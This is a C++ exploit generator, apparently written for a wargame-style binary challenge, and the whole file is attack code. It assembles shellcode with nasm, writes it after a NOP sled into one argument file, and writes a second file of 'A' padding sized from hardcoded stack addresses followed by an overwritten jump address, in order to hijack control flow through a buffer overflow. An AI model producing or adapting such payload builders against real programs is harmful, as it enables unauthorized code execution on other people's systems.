#include <iostream>
#include <fstream>
#include <sstream>

typedef unsigned int uint;

std::string username = "dat_wil";

uint eip = 0xffffd60c;
uint bufferAddr = 0xffffd5bc;
uint padding = eip - bufferAddr;

std::string raw_shellcode;

int compile(const char *asm_path)
{
	std::string command = "nasm -f bin -o shellcode_light ";
	command += asm_path;
	if (std::system(command.c_str()) != 0)
	{
		std::cerr << "Failed to compile shellcode" << std::endl;
		return 0;
	}
	return 1;
}

std::string getCompiledAsm()
{
	std::ifstream file("shellcode_light");
	std::string shellcode;

	std::getline(file, shellcode);
	return shellcode;
}

int writeShellCode1()
{
	std::ofstream file("args/arg1");
	std::string shellcode = raw_shellcode.empty() ? getCompiledAsm() : raw_shellcode;
	int shellcodeLength = shellcode.length();

	file << username;

	for (uint i = 0; i < 100; i++)
		file << (char)0x90;

	file << shellcode;
	file << '\n';
	file.close();
	return 1;
}

void writeShellCode2()
{
	std::ofstream file("args/arg2");
	uint addr_jmp = 0x804a040;

	for (uint i = 0; i < padding; i++)
		file << (char)'A';

	for (int i = 0; i < 4; i++)
		file << ((char *)(&addr_jmp))[i];

	file << '\n';
	file.close();
}

int main(int argc, char const *argv[])
{
	if (raw_shellcode.empty())
	{
		if (argc != 2)
		{
			std::cout << "Usage: " << argv[0] << " <shellcode.s>" << std::endl;
			return 1;
		}
		if (!compile(argv[1]))
			return 1;
	}
	if (!writeShellCode1())
		return 1;
	writeShellCode2();
	return 0;
}
